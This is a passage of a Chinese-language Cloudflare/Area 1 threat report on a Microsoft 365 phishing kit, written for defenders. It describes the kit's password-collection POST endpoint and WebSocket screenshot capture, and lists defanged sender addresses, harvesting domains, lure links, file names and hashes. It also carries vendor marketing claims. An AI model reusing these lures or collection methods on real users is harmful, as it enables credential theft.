/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Z4GF8RY261PT6XZ31241.png&amp;w=828&amp;h=643&amp;f=webp&amp;fit=cover&amp;position=center 828w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Z4GF8RY261PT6XZ31241.png&amp;w=1080&amp;h=838&amp;f=webp&amp;fit=cover&amp;position=center 1080w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Z4GF8RY261PT6XZ31241.png&amp;w=1280&amp;h=994&amp;f=webp&amp;fit=cover&amp;position=center 1280w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Z4GF8RY261PT6XZ31241.png&amp;w=1430&amp;h=1110&amp;f=webp&amp;fit=cover&amp;position=center 1430w" alt="BLOG-1437 Embedded Image - 9Fsm2W" loading="lazy" decoding="async" data-image-placeholder-media="true" data-lightbox-src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW45Z4GF8RY261PT6XZ31241.png&amp;w=1286&amp;h=998&amp;f=webp" data-lightbox-width="1286" data-lightbox-height="998" data-astro-cid-7nvefuv6="true" sizes="(min-width: 715px) 715px, 100vw" data-astro-image="constrained" data-astro-image-fit="cover" data-astro-image-pos="center" width="715" height="555" class="pt-portable-image-media"></div>
+</figure>
+<p>在某些情況下，攻擊者甚至透過預先擷取本地化的 Office 365 登入，以此來變得更加隱蔽：</p>
+<ul>
+	<li>若受害者輸入他們的電子郵件地址，攻擊者就會驗證這是一個有效的 Office 365 位址。</li>
+	<li>在輸入的電子郵件地址使用條件式存取、不同的單一登入 (SSO)、Active Directory Federation Service (ADFS) 等情況下，網路釣魚套件基本上會中斷，而受害者只會被重新導向至合法的登入體驗。</li>
+</ul>
+<p>若受害者輸入了密碼，則就會透過 HTTP POST 要求將密碼作為表單資料傳送給攻擊者：</p>
+<p><code>hxxps://microsoftofficeonlineservices[.]outlookprivacypolicy[.]online/common/oauth2-authorize/index[.]php</code></p>
+<p>此時，攻擊者可以完全存取受害者的電子郵件帳戶，若受害者重複使用其密碼，可能還會存取其他系統或服務。</p>
+<p>仔細查看憑證收集網站的原始程式碼就可以發現，威脅執行者使用免費授權進行前端 Web 開發，協助建立<a href="https://www.bankinfosecurity.com/demand-for-phishing-kits-strong-report-a-14140" target="_blank" rel="noopener noreferrer">高階網路釣魚套件</a>來複製 Microsoft 登入頁面。</p>
+<p>對於某些觀察到的活動，網路釣魚套件根據 URL 中硬編碼的電子郵件地址建立了不同的子網域。變更電子郵件地址會中斷連結，導致重新導向至偽造的 Microsoft 服務協定頁面、Google 首頁或只是空白頁面。</p>
+<p><strong>在典型的普通憑證收集器中，任何電子郵件地址都可以作為 URL 參數輸入，而不會影響其功能，與之不同的是，此活動意味著威脅執行者對特定的預先確定目標清單感興趣。</strong></p>
+<p>與典型的憑證收集器（以及基本的網路釣魚套件）相比，此次網路釣魚活動的另一個主要區別在於，使用 WebSocket 在每次點選時將螢幕擷取畫面傳送回攻擊者，特別是當受害者在輸入其電子郵件地址和密碼後按一下「下一步」按鈕時。</p>
+<p>圖 8 突出顯示如何使用 JavaScript 執行螢幕擷取畫面功能，並在 Base64 中編碼所產生的影像。</p>
+<p>圖 8. 網路釣魚套件 Base64 編碼螢幕擷取畫面的證據</p>
+<figure class="emdash-image pt-portable-image" data-astro-cid-7nvefuv6="">
+	<div class="pt-portable-image-frame" data-image-placeholder-frame="" data-astro-cid-7nvefuv6=""><img class="pt-portable-image-placeholder" data-image-placeholder="" src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%201%201%22%3E%3Crect%20width%3D%221%22%20height%3D%221%22%20fill%3D%22rgb(243%2C243%2C243)%22%2F%3E%3C%2Fsvg%3E" alt="" width="715" height="460" loading="eager" decoding="async" aria-hidden="true" data-astro-cid-7nvefuv6=""><img src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW460M9WHZ66JG4J4T7NWHM2.png&amp;w=715&amp;h=460&amp;f=webp&amp;fit=cover&amp;position=center" srcset="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW460M9WHZ66JG4J4T7NWHM2.png&amp;w=640&amp;h=412&amp;f=webp&amp;fit=cover&amp;position=center 640w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW460M9WHZ66JG4J4T7NWHM2.png&amp;w=715&amp;h=460&amp;f=webp&amp;fit=cover&amp;position=center 715w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW460M9WHZ66JG4J4T7NWHM2.png&amp;w=750&amp;h=483&amp;f=webp&amp;fit=cover&amp;position=center 750w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW460M9WHZ66JG4J4T7NWHM2.png&amp;w=828&amp;h=533&amp;f=webp&amp;fit=cover&amp;position=center 828w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW460M9WHZ66JG4J4T7NWHM2.png&amp;w=1080&amp;h=695&amp;f=webp&amp;fit=cover&amp;position=center 1080w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW460M9WHZ66JG4J4T7NWHM2.png&amp;w=1280&amp;h=823&amp;f=webp&amp;fit=cover&amp;position=center 1280w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW460M9WHZ66JG4J4T7NWHM2.png&amp;w=1430&amp;h=920&amp;f=webp&amp;fit=cover&amp;position=center 1430w" alt="BLOG-1437 Embedded Image - TreKg2" loading="lazy" decoding="async" data-image-placeholder-media="true" data-lightbox-src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW460M9WHZ66JG4J4T7NWHM2.png&amp;w=915&amp;h=589&amp;f=webp" data-lightbox-width="915" data-lightbox-height="589" data-astro-cid-7nvefuv6="true" sizes="(min-width: 715px) 715px, 100vw" data-astro-image="constrained" data-astro-image-fit="cover" data-astro-image-pos="center" width="715" height="460" class="pt-portable-image-media"></div>
+</figure>
+<figure class="emdash-image pt-portable-image" data-astro-cid-7nvefuv6="">
+	<div class="pt-portable-image-frame" data-image-placeholder-frame="" data-astro-cid-7nvefuv6=""><img class="pt-portable-image-placeholder" data-image-placeholder="" src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%201%201%22%3E%3Crect%20width%3D%221%22%20height%3D%221%22%20fill%3D%22rgb(243%2C243%2C243)%22%2F%3E%3C%2Fsvg%3E" alt="" width="715" height="398" loading="eager" decoding="async" aria-hidden="true" data-astro-cid-7nvefuv6=""><img src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW4551N6GCWE3Q8W5V45NW70.png&amp;w=715&amp;h=398&amp;f=webp&amp;fit=cover&amp;position=center" srcset="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW4551N6GCWE3Q8W5V45NW70.png&amp;w=640&amp;h=356&amp;f=webp&amp;fit=cover&amp;position=center 640w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW4551N6GCWE3Q8W5V45NW70.png&amp;w=715&amp;h=398&amp;f=webp&amp;fit=cover&amp;position=center 715w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW4551N6GCWE3Q8W5V45NW70.png&amp;w=750&amp;h=417&amp;f=webp&amp;fit=cover&amp;position=center 750w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW4551N6GCWE3Q8W5V45NW70.png&amp;w=828&amp;h=461&amp;f=webp&amp;fit=cover&amp;position=center 828w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW4551N6GCWE3Q8W5V45NW70.png&amp;w=1080&amp;h=601&amp;f=webp&amp;fit=cover&amp;position=center 1080w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW4551N6GCWE3Q8W5V45NW70.png&amp;w=1280&amp;h=713&amp;f=webp&amp;fit=cover&amp;position=center 1280w, /_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW4551N6GCWE3Q8W5V45NW70.png&amp;w=1430&amp;h=796&amp;f=webp&amp;fit=cover&amp;position=center 1430w" alt="BLOG-1437 Embedded Image - kim6L1" loading="lazy" decoding="async" data-image-placeholder-media="true" data-lightbox-src="/_image?href=https%3A%2F%2Fblog.cloudflare.com%2F_emdash%2Fapi%2Fmedia%2Ffile%2F01KW4551N6GCWE3Q8W5V45NW70.png&amp;w=1518&amp;h=845&amp;f=webp" data-lightbox-width="1518" data-lightbox-height="845" data-astro-cid-7nvefuv6="true" sizes="(min-width: 715px) 715px, 100vw" data-astro-image="constrained" data-astro-image-fit="cover" data-astro-image-pos="center" width="715" height="398" class="pt-portable-image-media"></div>
+</figure>
+<p>很明顯，Area 1 Security 觀察到的各種活動利用了高階網路釣魚套件，該套件使用了上述各種技術以及一套不同的網路釣魚基礎結構。</p>
+<p><strong>至少使用九個不同的網域來託管憑證收集器。其中四個網域具有 Microsoft 主題的名稱，似乎由攻擊者控制：</strong></p>
+<ul>
+	<li>microsoftofficeonlineservices[.]com</li>
+	<li>outlookprivacypolicy[.]online</li>
+	<li>office-policy-center[.]com</li>
+	<li>ms365[.]us</li>
+</ul>
+<p>不足為奇的是，其餘網域是被攻擊者入侵的合法網站，並被選擇用於其網路釣魚操作。對於攻擊者而言，選擇良性網站託管惡意內容有一系列好處，其中最重要的是該網站的正面聲譽。它還減少了攻擊者購買能很容易追溯到他們的基礎結構的需求。</p>
+<p>儘管這些憑證收集器偽造了 Microsoft 登入頁面，但在被標記為惡意內容並予以刪除之前，許多網站仍在相當長的時間內處於活動狀態。這種「打地鼠」的遊戲根本不足以嚇退這些欺詐者。每次刪除後，新的網路釣魚基礎結構迅速浮出水面。</p>
+<h3>如何阻止憑證收集器</h3>
+<p>由於威脅執行者能夠竊取員工憑證，因此公司務必準備足夠的防禦措施來保護使用者，以免他們成為這些登入主題攻擊的受害者。隨著攻擊者不斷發明繞過防禦措施的新方法，包括使用高階網路釣魚套件，安全從業者需要尋求電子郵件安全技術的前沿解決方案，以封鎖這些具有高度破壞性的網路釣魚活動。</p>
+<p>新的策略和方法或許能誘騙傳統供應商和雲端電子郵件提供者（例如 Microsoft），但是 Area 1 Security 的雲端原生電子郵件安全解決方案可以阻止這些攻擊者的行動。使用進階的機器學習和人工智慧技術後，我們的演算法會即時發現惡意執行者用來繞過防禦措施的新策略（平均比產業基準提前 24 天），而無需等待數天或數週的簽名更新。零時間偵測以可靠的判斷引領業界，在交付時阻止網路釣魚嘗試，因此使用者永遠不會受到攻擊。</p>
+<h3>入侵指標</h3>
+<p><strong>網路釣魚電子郵件主旨列：</strong></p>
+<p>重要服務變更</p>
+<p>&lt;目標公司名稱&gt; PDF 新政策</p>
+<p>&lt;目標公司名稱&gt; PDF 服務</p>
+<p>收到來自無法辨識來電者 ID 的語音訊息　-　&lt;目標公司名稱&gt;</p>
+<p><strong>寄件者顯示名稱：</strong></p>
+<p>&lt;目標公司名稱&gt; TOS</p>
+<p>&lt;目標公司名稱&gt; Outlook</p>
+<p>&lt;目標公司名稱&gt; 通知</p>
+<p>&lt;目標公司名稱&gt; 政策</p>
+<p>&lt;目標公司名稱&gt; 語音留言</p>
+<p>&lt;目標公司名稱&gt; 語言信箱</p>
+<p>無回覆</p>
+<p>無回覆</p>
+<p>無回覆</p>
+<p><strong>寄件者地址：</strong></p>
+<p>audio-center@voicemail[.]microsoftoutlookwebservices[.]online</p>
+<p>audio@voicebox[.]microsoftoutlookwebservices[.]online</p>
+<p>mail-service@microsoftoutlookwebservices[.]online</p>
+<p>mailman@microsoftoutlookwebservices[.]online</p>
+<p>messages@voicebox[.]microsoftoutlookwebservices[.]online</p>
+<p>no-reply@voicemailbox[.]microsoftoutlookwebservices[.]online</p>
+<p>noreply@tos[.]microsoftoutlookwebservices[.]online</p>
+<p>postfix@relay-server[.]microsoftoutlookwebservices[.]online</p>
+<p>terms@tos[.]microsoftoutlookwebservices[.]online</p>
+<p>voicemail@message-center[.]microsoftoutlookwebservices[.]online</p>
+<p>voicemail@microsoftoutlookwebservices[.]online</p>
+<p>no-reply@outlookonlinewebservices-com[.]online</p>
+<p>noreply@outlookonlinewebservices-com[.]online</p>
+<p>o365@outlookonlinewebservices-com[.]online</p>
+<p>service@outlookonlinewebservices-com[.]online</p>
+<p>msa@microsoft-message-center[.]outlookonlinewebservices-com[.]online</p>
+<p>no-reply@microsoft-message-center[.]outlookonlinewebservices-com[.]online</p>
+<p>noreply@microsoft-message-center[.]outlookonlinewebservices-com[.]online</p>
+<p>o365@microsoft-message-center[.]outlookonlinewebservices-com[.]online</p>
+<p>service@microsoft-message-center[.]outlookonlinewebservices-com[.]online</p>
+<p>message-center@microsoftofficeonlinemessagecenter-com[.]ru</p>
+<p>msa@microsoftofficeonlinemessagecenter-com[.]ru</p>
+<p>no-reply@microsoftofficeonlinemessagecenter-com[.]ru</p>
+<p>noreply@microsoftofficeonlinemessagecenter-com[.]ru</p>
+<p>policy@microsoftofficeonlinemessagecenter-com[.]ru</p>
+<p>o365@message-center[.]microsoftofficeonlinemessagecenter-com[.]ru</p>
+<p>policy@message-center[.]microsoftofficeonlinemessagecenter-com[.]ru</p>
+<p>no-reply@office[.]microsoftofficeonlinemessagecenter[.]com[.]ru</p>
+<p>office@service[.]microsoftofficeonlinemessagecenter[.]com[.]ru</p>
+<p>do-not-reply@delayed[.]entrepreserves[.]com</p>
+<p>enitity@express[.]entrepreserves[.]com</p>
+<p>nooze@ghosted[.]entrepreserves[.]com</p>
+<p>no-reply@unnnetworked[.]sollutiance[.]com</p>
+<p>no-reply@mynetwork[.]unnetflow[.]com</p>
+<p><strong>執行者控制的憑證收集網站：</strong></p>
+<p>microsoftofficeonlineservices[.]com</p>
+<p>outlookprivacypolicy[.]online</p>
+<p>office-policy-center[.]com</p>
+<p>ms365[.]us</p>
+<p><strong>執行者入侵的憑證收集網站：</strong></p>
+<p>al-abdal[.]net</p>
+<p>goatourspackage[.]com</p>
+<p>perpustakaanarda[.]papua[.]go[.]id</p>
+<p>satoshiation[.]com</p>
+<p>simpus3[.]bandungkab[.]go[.]id</p>
+<p>theeditorngr[.]com</p>
+<p><strong>網路釣魚電子郵件中識別的連結：</strong></p>
+<p><a href="https://www/[./]microsoftofficeonlineservices/[./]com/b/service/?username=%5C%5B%E7%9B%AE%E6%A8%99%E9%9B%BB%E5%AD%90%E9%83%B5%E4%BB%B6%E5%9C%B0%E5%9D%80%5C%5D" target="_blank" rel="noopener noreferrer">https://www\[.\]microsoftofficeonlineservices\[.\]com/b/service/?username=\[目標電子郵件地址\]</a></p>
+<p><a href="https://login/[./]microsoftofficeonlineservices/[./]com?e=%5C%5Bbase64" target="_blank" rel="noopener noreferrer">https://login\[.\]microsoftofficeonlineservices\[.\]com?e=\[base64</a> 編碼的電子郵件]</p>
+<p><a href="https://login/[./]microsoftonlineservices/[./]office-policy-center/[./]com/?e=%5C%5Bbase64" target="_blank" rel="noopener noreferrer">https://login\[.\]microsoftonlineservices\[.\]office-policy-center\[.\]com/?e=\[base64</a> 編碼的目標電子郵件地址]</p>
+<p><a href="http://ms365/[./]us/account-login?e=%5C%5Bbase64" target="_blank" rel="noopener noreferrer">http://ms365\[.\]us/account-login?e=\[base64</a> 編碼的目標電子郵件地址]</p>
+<p><a href="https://goatourspackage/[./]com/?e=%5C%5Bbase64" target="_blank" rel="noopener noreferrer">https://goatourspackage\[.\]com/?e=\[base64</a> 編碼的電子郵件]</p>
+<p><a href="https://simpus3/[./]bandungkab/[./]go/[./]id/?username=%5C%5Bbase64" target="_blank" rel="noopener noreferrer">https://simpus3\[.\]bandungkab\[.\]go\[.\]id/?username=\[base64</a> 編碼的電子郵件]</p>
+<p><a href="https://al-abdal/[./]net/outlook/test/?e=%5C%5Bbase64" target="_blank" rel="noopener noreferrer">https://al-abdal\[.\]net/outlook/test/?e=\[base64</a> 編碼的電子郵件]</p>
+<p><a href="https://al-abdal/[./]net/outlook/test/?e=%5C%5Bbase64" target="_blank" rel="noopener noreferrer">https://al-abdal\[.\]net/outlook/test/?e=\[base64</a> 編碼的電子郵件]</p>
+<p><a href="https://theeditorngr/[./]com/@?username=%5C%5Bbase64" target="_blank" rel="noopener noreferrer">https://theeditorngr\[.\]com/@?username=\[base64</a> 編碼的目標電子郵件地址]</p>
+<p><a href="https://perpustakaanarda/[./]papua/[./]go/[./]id?e=%5C%5B%E7%9B%AE%E6%A8%99%E9%9B%BB%E5%AD%90%E9%83%B5%E4%BB%B6%E5%9C%B0%E5%9D%80%5C%5D" target="_blank" rel="noopener noreferrer">https://perpustakaanarda\[.\]papua\[.\]go\[.\]id?e=\[目標電子郵件地址\]</a></p>
+<p><strong>惡意檔案名稱：</strong></p>
+<p>&lt;目標公司名稱&gt;_TOS-Updated_v&lt;8-digit number&gt;.pdf</p>
+<p>&lt;目標公司名稱&gt;PDF Policy_v&lt;8-digit number&gt;.pdf</p>
+<p>&lt;目標公司名稱&gt;_VoiceMessage&lt;8-digit number&gt;.html</p>
+<p>Microsoft-Policy-Updated.pdf</p>
+<p>PolicyUpdate.htm</p>
+<p><strong>修改後的 Microsoft 標誌雜湊：</strong></p>
+<p>MD5: &nbsp;900b8133ac181eedbbd698ee2a2fabbc</p>
+<p>SHA1: 1106889AAA1BAFF9F00904BE335F5A373EE7C059</p>
+<p>SHA256: 29256ABAEC0B1325152FC8ADDA5EF62E3BCAE45860A004221EC027321436FEBF</p>
